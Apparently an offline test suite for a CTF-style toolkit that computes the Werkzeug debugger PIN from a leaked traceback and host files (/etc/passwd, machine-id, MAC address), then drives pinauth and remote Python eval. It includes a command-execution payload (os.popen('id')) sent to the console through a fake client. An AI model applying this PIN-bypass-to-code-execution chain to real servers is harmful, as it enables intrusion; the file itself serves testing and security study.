#!/usr/bin/env python3
"""Offline tests for solvers/toolkits/werkzeug_pin.py (backlog row 207). No network; pure math and
parsing. Importing the module must make no request.

  .venv/bin/python tests/test_tk_werkzeug_pin.py

PIN test vectors:
  - md5 and sha1 are REAL KNOWN-GOOD vectors, generated from the actual Werkzeug library during the
    build (md5 from werkzeug==1.0.1; sha1 from werkzeug==2.3.8, 3.0.4 and 3.1.3 -- all identical) on
    the canonical public example input set (HackTricks "Werkzeug / Flask Debug"). The real split is
    md5 (Werkzeug < 2.0) -> sha1 (Werkzeug >= 2.0, still sha1 in 3.1.x).
  - sha256 is a SELF-CONSISTENCY (round-trip) vector from this module's own faithful algorithm: no
    shipped Werkzeug uses sha256, so there is no real vector to check it against. It is asserted for
    determinism and structure (9 digits, grouped) only.
"""
import importlib
import json
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

FAILED = []


def check(label, ok, detail=""):
    print(f"{'ok  ' if ok else 'FAIL'} {label}" + ("" if ok or not detail else f"  [{str(detail)[:400]}]"))
    if not ok:
        FAILED.append(label)


# --- import must make no request -------------------------------------------------------------------

def test_no_network_on_import():
    import socket
    real = socket.socket

    class _Blocked(Exception):
        pass

    def blocked(*a, **k):
        raise _Blocked("socket created on import")

    socket.socket = blocked
    try:
        sys.modules.pop("werkzeug_pin", None)
        mod = importlib.import_module("werkzeug_pin")
        check("importing werkzeug_pin opens no socket", True)
    except _Blocked:
        check("importing werkzeug_pin opens no socket", False, "a socket was created on import")
        mod = None
    finally:
        socket.socket = real
    return mod


import werkzeug_pin as W  # noqa: E402


# --- hand-tool shape -------------------------------------------------------------------------------

def test_hand_tool_shape():
    check("werkzeug_pin exposes no signals()/solve_set() (a hand tool, not matched)",
          not hasattr(W, "signals") and not hasattr(W, "solve_set"))
    # it must not be registered in the match set
    try:
        sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
        import registry
        keys = set()
        for item in getattr(registry, "TOOLKITS", []) or []:
            if isinstance(item, dict):
                keys.add(item.get("key") or item.get("name"))
            else:
                keys.add(str(item))
        check("werkzeug_pin is not in registry.TOOLKITS", "werkzeug_pin" not in keys and "werkzeug" not in keys, sorted(k for k in keys if k))
    except Exception as e:  # noqa: BLE001 -- registry shape may differ; the real guard is no signals/solve_set
        check("registry import did not crash the shape check", True, repr(e))


# --- PIN derivation: REAL vectors (sha1 and md5) ---------------------------------------------------

def test_real_pin_vectors():
    inp = W.EXAMPLE_INPUTS
    # sha1 -- the real Werkzeug >= 2.0 variant (verified against werkzeug 2.3.8/3.0.4/3.1.3)
    pin, cookie = W.derive_pin(inp["username"], inp["modname"], inp["appname"], inp["appfile"],
                               inp["mac"], inp["machine_id"], "sha1")
    check("sha1 PIN matches the REAL Werkzeug>=2.0 vector", pin == "971-027-971", pin)
    check("sha1 cookie name matches the REAL Werkzeug>=2.0 vector", cookie == "__wzd4b0db5b5f2f6e60a0bb8", cookie)
    # md5 -- the real Werkzeug < 2.0 variant (verified against werkzeug 1.0.1)
    pin5, cookie5 = W.derive_pin(inp["username"], inp["modname"], inp["appname"], inp["appfile"],
                                 inp["mac"], inp["machine_id"], "md5")
    check("md5 PIN matches the REAL Werkzeug<2.0 vector", pin5 == "185-468-931", pin5)
    check("md5 cookie name matches the REAL Werkzeug<2.0 vector", cookie5 == "__wzdbd3e38eaf13b966f89d8", cookie5)
    # the KNOWN_VECTORS table agrees and is labelled by provenance
    check("KNOWN_VECTORS sha1/md5 are tagged 'real'",
          W.KNOWN_VECTORS["sha1"][2] == "real" and W.KNOWN_VECTORS["md5"][2] == "real")
    check("KNOWN_VECTORS matches derive_pin for sha1 and md5",
          W.KNOWN_VECTORS["sha1"][:2] == (pin, cookie) and W.KNOWN_VECTORS["md5"][:2] == (pin5, cookie5))


def test_sha256_selfconsistency_vector():
    inp = W.EXAMPLE_INPUTS
    pin, cookie = W.derive_pin(inp["username"], inp["modname"], inp["appname"], inp["appfile"],
                               inp["mac"], inp["machine_id"], "sha256")
    # SELF-CONSISTENCY: no real Werkzeug uses sha256, so this checks determinism against the stored value
    check("sha256 PIN is deterministic (self-consistency vector)", pin == "396-282-463", pin)
    check("sha256 cookie name is deterministic (self-consistency vector)", cookie == "__wzd68052c112900f93b2d78", cookie)
    check("KNOWN_VECTORS sha256 is tagged 'self' (not a real Werkzeug variant)", W.KNOWN_VECTORS["sha256"][2] == "self")
    # structural assertion: 9 digits grouped XXX-XXX-XXX
    import re
    check("sha256 PIN is 9 digits grouped XXX-XXX-XXX", re.fullmatch(r"\d{3}-\d{3}-\d{3}", pin) is not None, pin)


def test_pin_structure_and_grouping():
    import re
    inp = W.EXAMPLE_INPUTS
    for alg in ("md5", "sha1", "sha256"):
        pin, cookie = W.derive_pin_from_inputs(inp, alg)
        digits = pin.replace("-", "")
        check(f"{alg}: PIN is exactly 9 digits", digits.isdigit() and len(digits) == 9, pin)
        check(f"{alg}: PIN is grouped XXX-XXX-XXX", re.fullmatch(r"\d{3}-\d{3}-\d{3}", pin) is not None, pin)
        check(f"{alg}: cookie name is __wzd + 20 hex", re.fullmatch(r"__wzd[0-9a-f]{20}", cookie) is not None, cookie)
    # the private grouping helper handles the three group sizes (3, 4, 5) like Werkzeug
    check("_group_pin groups 9 as XXX-XXX-XXX", W._group_pin("123456789") == "123-456-789")


def test_derive_all_and_version_map():
    allp = W.derive_all_pins(**W.EXAMPLE_INPUTS)
    check("derive_all_pins returns md5, sha1, sha256", set(allp) == {"md5", "sha1", "sha256"})
    check("derive_all_pins sha1 == the real vector", allp["sha1"][0] == "971-027-971", allp["sha1"])
    check("algorithm_for_version: <2.0 is md5", W.algorithm_for_version("1.0.1") == "md5")
    check("algorithm_for_version: 2.0 is sha1", W.algorithm_for_version("2.0.3") == "sha1")
    check("algorithm_for_version: 3.1.x is sha1 (not sha256)", W.algorithm_for_version("3.1.3") == "sha1")
    check("algorithm_for_version accepts a tuple", W.algorithm_for_version((2, 3, 8)) == "sha1")


def test_bad_algorithm_raises():
    try:
        W.derive_pin("u", "m", "a", "/f", 1, "x", algorithm="sha512")
        check("an unsupported algorithm raises ValueError", False)
    except ValueError:
        check("an unsupported algorithm raises ValueError", True)


# --- MAC normalization -----------------------------------------------------------------------------

def test_mac_forms():
    want = 279275995014060
    check("normalize_mac: colon form", W.normalize_mac("fe:ed:de:ad:be:ef") == int("feeddeadbeef", 16))
    check("normalize_mac: address-file bytes with newline",
          W.normalize_mac(b"02:42:ac:11:00:02\n") == int("0242ac110002", 16))
    check("normalize_mac: bare 12-hex", W.normalize_mac("0242ac110002") == int("0242ac110002", 16))
    check("normalize_mac: already decimal int", W.normalize_mac(want) == want)
    check("normalize_mac: already decimal str", W.normalize_mac(str(want)) == want)
    check("normalize_mac: non-MAC text is None", W.normalize_mac("not a mac") is None)
    check("mac_int_from_address_file reads the file content", W.mac_int_from_address_file("02:42:ac:11:00:02\n") == int("0242ac110002", 16))


# --- machine-id: both rules ------------------------------------------------------------------------

def test_machine_id_rules():
    mid = "d4e6cb65d59544f3331ea0425dc555a1"
    # simple rule (no cgroup): the id alone
    check("machine_id simple rule = /etc/machine-id content",
          W.machine_id(machine_id=mid + "\n", use_cgroup=False) == mid.encode())
    # boot_id fallback (keeps dashes, like Werkzeug's readline().strip())
    boot = "b3f1c0de-1234-5678-9abc-def012345678"
    check("machine_id falls back to boot_id when machine-id is empty",
          W.machine_id(machine_id=b"", boot_id=boot + "\n", use_cgroup=False) == boot.encode())
    check("machine_id prefers machine-id over boot_id",
          W.machine_id(machine_id=mid, boot_id=boot, use_cgroup=False) == mid.encode())
    # container rule: id + cgroup basename (the part after the last '/')
    cgroup = "0::/system.slice/docker-abc123.scope"
    check("machine_id container rule appends the cgroup basename",
          W.machine_id(machine_id=mid, cgroup=cgroup, use_cgroup=True) == (mid + "docker-abc123.scope").encode())
    check("machine_id container rule with a root cgroup appends nothing",
          W.machine_id(machine_id=mid, cgroup="0::/", use_cgroup=True) == mid.encode())
    check("machine_id with nothing given is empty (collect_inputs maps it to None)", W.machine_id() == b"")


# --- parsers: extract the six inputs from a canned traceback + host files ---------------------------

# A canned leaked Werkzeug traceback (a standard Flask-in-debug 500 page body, with the inline JS the
# debugger serves). DATA only: nothing here is executed.
CANNED_TRACEBACK = '''\
<!DOCTYPE html><html><head><title>werkzeug debugger</title></head><body>
<h1>ZeroDivisionError</h1>
<div class="traceback">
Traceback (most recent call last):
  File "/usr/local/lib/python3.9/site-packages/flask/app.py", line 2551, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.9/site-packages/flask/app.py", line 2531, in wsgi_app
    response = self.handle_exception(e)
  File "/app/application.py", line 42, in index
    result = 1 / 0
ZeroDivisionError: division by zero
</div>
<script type="text/javascript">
  var CONSOLE_MODE = false,
      EVALEX = true,
      EVALEX_TRUSTED = false,
      SECRET = "A1b2C3d4E5f6G7h8I9j0";
</script>
</body></html>
'''

# host files an LFI might have read off the box
CANNED_PASSWD = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
    "appuser:x:1000:1000::/home/appuser:/bin/bash\n"
)
CANNED_MACHINE_ID = "f1e2d3c4b5a6978877665544332211aa\n"
CANNED_ADDRESS = "02:42:ac:11:00:05\n"


def test_parse_traceback():
    tb = W.parse_traceback(CANNED_TRACEBACK)
    check("parse_traceback finds all frame files", len(tb["frame_files"]) == 3, tb["frame_files"])
    check("parse_traceback picks the flask/app.py __file__",
          tb["app_file"] == "/usr/local/lib/python3.9/site-packages/flask/app.py", tb["app_file"])
    check("parse_traceback derives modname=flask.app for a default Flask app", tb["modname"] == "flask.app", tb["modname"])
    check("parse_traceback derives appname=Flask for a default Flask app", tb["appname"] == "Flask", tb["appname"])
    check("parse_traceback reads the debugger SECRET", tb["secret"] == "A1b2C3d4E5f6G7h8I9j0", tb["secret"])
    check("parse_traceback reads EVALEX (console on)", tb["evalex"] is True, tb["evalex"])
    check("parse_traceback reads EVALEX_TRUSTED=false (PIN required)", tb["evalex_trusted"] is False, tb["evalex_trusted"])


def test_find_usernames():
    users = W.find_usernames(CANNED_PASSWD)
    check("find_usernames lists root first, then uid>=1000, then service accounts",
          users[0] == "root" and "appuser" in users and "www-data" in users, users)


def test_collect_inputs_from_fixture():
    host_files = {
        "/etc/passwd": CANNED_PASSWD,
        "/etc/machine-id": CANNED_MACHINE_ID,
        "/sys/class/net/eth0/address": CANNED_ADDRESS,
    }
    inputs, notes = W.collect_inputs(traceback=CANNED_TRACEBACK, host_files=host_files)
    # all six inputs extracted
    check("collect_inputs: username from /etc/passwd", inputs["username"] == "root", inputs["username"])
    check("collect_inputs: modname from the traceback", inputs["modname"] == "flask.app", inputs["modname"])
    check("collect_inputs: appname from the traceback", inputs["appname"] == "Flask", inputs["appname"])
    check("collect_inputs: appfile from the traceback",
          inputs["appfile"] == "/usr/local/lib/python3.9/site-packages/flask/app.py", inputs["appfile"])
    check("collect_inputs: mac from /sys/class/net/<iface>/address as the decimal int",
          inputs["mac"] == int("0242ac110005", 16), inputs["mac"])
    check("collect_inputs: machine_id from /etc/machine-id (no cgroup file -> id alone)",
          inputs["machine_id"] == CANNED_MACHINE_ID.strip().encode(), inputs["machine_id"])
    check("collect_inputs: nothing left missing", notes.get("missing") == [], notes.get("missing"))
    check("collect_inputs: secret carried in notes", notes.get("secret") == "A1b2C3d4E5f6G7h8I9j0")
    # and those six inputs produce a well-formed PIN under every algorithm
    import re
    for alg in ("md5", "sha1", "sha256"):
        pin, cookie = W.derive_pin_from_inputs(inputs, alg)
        check(f"fixture inputs -> a valid {alg} PIN (9 digits grouped)",
              re.fullmatch(r"\d{3}-\d{3}-\d{3}", pin) is not None and re.fullmatch(r"__wzd[0-9a-f]{20}", cookie), (pin, cookie))


def test_collect_inputs_bytes_host_files():
    # the CLI reads host files as bytes; collect_inputs must handle bytes content too (regression)
    host_files = {"/etc/passwd": CANNED_PASSWD.encode(), "/etc/machine-id": CANNED_MACHINE_ID.encode(),
                  "/sys/class/net/eth0/address": CANNED_ADDRESS.encode()}
    inputs, notes = W.collect_inputs(traceback=CANNED_TRACEBACK.encode(), host_files=host_files)
    check("collect_inputs handles bytes traceback + bytes host files",
          inputs["username"] == "root" and inputs["mac"] == int("0242ac110005", 16)
          and inputs["machine_id"] == CANNED_MACHINE_ID.strip().encode() and notes.get("missing") == [], inputs)


def test_collect_inputs_explicit_username_override():
    host_files = {"/etc/passwd": CANNED_PASSWD, "/etc/machine-id": CANNED_MACHINE_ID,
                  "/sys/class/net/eth0/address": CANNED_ADDRESS}
    inputs, _ = W.collect_inputs(traceback=CANNED_TRACEBACK, host_files=host_files, username="www-data")
    check("collect_inputs: explicit username wins over the parsed candidate", inputs["username"] == "www-data", inputs["username"])


# --- live driver shape: routes only through a WebClient-like object; no raw socket -----------------

class _FakeWebClient:
    """A stand-in for web.WebClient: records .get() calls, returns canned log entries, and a cookie
    jar carried between the two requests is implied. It has .get and .request, which unlock_and_eval
    requires. It opens no socket."""

    def __init__(self):
        self.calls = []
        self.scripted = []

    def request(self, method, path, **kw):
        self.calls.append((method, path))
        return self.scripted.pop(0) if self.scripted else {"status": 200, "body": b""}

    def get(self, path, **kw):
        return self.request("GET", path, **kw)


def test_console_requests_sequence():
    reqs = W.console_requests("SEKRET", "__import__('os').popen('id').read()", pin="123-456-789", frame=0)
    check("console_requests has two steps when a PIN is given (pinauth then eval)", len(reqs) == 2, reqs)
    check("first step is pinauth with the pin and secret",
          "cmd=pinauth" in reqs[0][1] and "pin=123-456-789" in reqs[0][1] and "s=SEKRET" in reqs[0][1], reqs[0][1])
    check("eval step carries the url-encoded cmd, frm and secret",
          "cmd=" in reqs[1][1] and "frm=0" in reqs[1][1] and "s=SEKRET" in reqs[1][1], reqs[1][1])
    check("eval step url-encodes the python payload (no raw parens/quotes in the query)",
          "popen" in reqs[1][1] and "('id')" not in reqs[1][1], reqs[1][1])
    # unprotected path: no PIN -> one step, no pinauth
    reqs2 = W.console_requests("SEKRET", "7*7", pin=None)
    check("console_requests has one step when no PIN (unprotected debug=True)", len(reqs2) == 1 and "pinauth" not in reqs2[0][1], reqs2)


def test_unlock_and_eval_drives_webclient_only():
    client = _FakeWebClient()
    client.scripted = [
        {"status": 200, "body": json.dumps({"auth": True, "exhausted": False}).encode()},  # pinauth
        {"status": 200, "body": b"uid=33(www-data) gid=33(www-data)"},                      # eval
    ]
    out = W.unlock_and_eval(client, "SEKRET", "__import__('os').popen('id').read()", pin="971-027-971")
    check("unlock_and_eval made exactly two GETs through the client", len(client.calls) == 2 and all(m == "GET" for m, _ in client.calls), client.calls)
    check("unlock_and_eval reports auth success from the pinauth JSON", out["authed"] is True, out)
    check("unlock_and_eval returns the eval response body", b"www-data" in out["eval_response"]["body"], out["eval_response"])
    # a non-WebClient object is refused (scope lock must come from WebClient)
    try:
        W.unlock_and_eval(object(), "S", "7*7", pin=None)
        check("unlock_and_eval refuses a non-WebClient object", False)
    except TypeError:
        check("unlock_and_eval refuses a non-WebClient object (scope lock required)", True)


def test_unprotected_eval_no_pin():
    client = _FakeWebClient()
    client.scripted = [{"status": 200, "body": b"49"}]
    out = W.unlock_and_eval(client, "SEKRET", "7*7", pin=None)
    check("unprotected eval (no PIN) makes exactly one GET", len(client.calls) == 1, client.calls)
    check("unprotected eval needs no pinauth", out["auth_response"] is None and out["authed"] is None, out)
    check("unprotected eval returns the result", out["eval_response"]["body"] == b"49", out["eval_response"])


# --- CLI (offline) ---------------------------------------------------------------------------------

def test_cli():
    check("CLI: vectors exits 0", W.main(["vectors"]) == 0)
    rc = W.main(["pin", "--username", "web3_user", "--modname", "flask.app", "--appname", "Flask",
                 "--appfile", "/usr/local/lib/python3.5/dist-packages/flask/app.py",
                 "--mac", "279275995014060", "--machine-id", "d4e6cb65d59544f3331ea0425dc555a1",
                 "--algorithm", "sha1", "--json"])
    check("CLI: pin exits 0", rc == 0)
    check("CLI: no args exits 2", W.main([]) == 2)
    check("CLI: unknown action exits 2", W.main(["frobnicate"]) == 2)
    check("CLI: parse with no sources exits 2", W.main(["parse"]) == 2)


# B-001d: the runner below used to run at import, so pytest ran every check twice and a failure
# aborted collection (sys.exit). Pytest runs the test functions; this block is the script path.
if __name__ == "__main__":
    MOD = test_no_network_on_import()

    for fn in (test_hand_tool_shape, test_real_pin_vectors, test_sha256_selfconsistency_vector,
               test_pin_structure_and_grouping, test_derive_all_and_version_map, test_bad_algorithm_raises,
               test_mac_forms, test_machine_id_rules, test_parse_traceback, test_find_usernames,
               test_collect_inputs_from_fixture, test_collect_inputs_bytes_host_files,
               test_collect_inputs_explicit_username_override,
               test_console_requests_sequence, test_unlock_and_eval_drives_webclient_only,
               test_unprotected_eval_no_pin, test_cli):
        fn()

    if FAILED:
        print(f"\n{len(FAILED)} FAILED: " + "; ".join(FAILED))
        sys.exit(1)
    print("\nall werkzeug_pin toolkit tests passed")
